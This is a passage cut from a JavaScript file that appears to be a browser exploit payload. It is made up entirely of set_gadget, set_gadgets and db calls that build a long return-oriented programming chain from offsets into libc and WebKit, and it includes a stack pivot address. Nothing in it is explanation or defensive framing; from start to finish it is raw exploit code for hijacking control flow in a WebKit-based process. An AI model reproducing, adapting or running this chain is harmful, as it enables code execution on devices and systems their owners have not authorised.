libc_base+793877, 
ropchain+85208, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+85240, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+85352, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+85336, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+85440, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+85512, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967284, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+85576, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+73968, 
libc_base+793877, 
ropchain+85688, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+85776, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+85792, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+85912, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+85928, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+85896, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+86024, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+86040, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+86152, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+86136, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+86240, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+86224, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+86336, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+86352, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+86464, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+86448, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+86536, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+86600, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877 
]);
db([32, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+86752, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+86768, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+86888, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+86872, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+87016, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+87032, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+87176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+87144, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+87160, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+87248, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+87304, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+87384, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+87488, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+87504, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+87592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+87648, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+87768, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+87856, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+87872, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+88016, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+87984, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+88000, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+88088, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+88144, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+88224, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+88328, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+88344, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+88432, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+88488, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+88560, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+88616, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
pivot_addr,
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+88768, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+88856, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+88872, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+89016, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+88984, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+89000, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+89088, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+89144, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+89224, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+89328, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+89344, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+89432, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+89488, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+89560, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+89616, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+89720, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+89808, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+89824, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+89968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+89936, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+89952, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+90040, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+90096, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+90176, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+90280, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+90296, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+90384, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+90440, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+90560, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+90648, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+90664, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+90808, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+90776, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+90792, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+90880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+90936, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+91016, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([7, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+91120, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+91136, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+91224, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+91280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+91352, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+91408, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+91512, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([40, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+91600, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+91616, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+91760, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+91728, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+91744, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+91856, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+91944, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+91960, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+92104, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+92072, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+92088, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+92176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+92232, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+92312, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+92416, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+92432, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+92520, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+92576, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+92648, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+92704, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+788575, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+92856, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+92944, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+92960, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+93104, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+93072, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+93088, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+93176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+93232, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+93312, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([9, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+93416, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+93432, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+93520, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+93576, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+93648, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+93704, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+93808, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+93896, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+93912, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+94056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+94024, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+94040, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+94128, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+94184, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+94264, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([6, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+94368, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+94384, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+94472, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+94528, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+94648, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+94736, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+94752, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+94896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+94864, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+94880, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+94968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+95024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
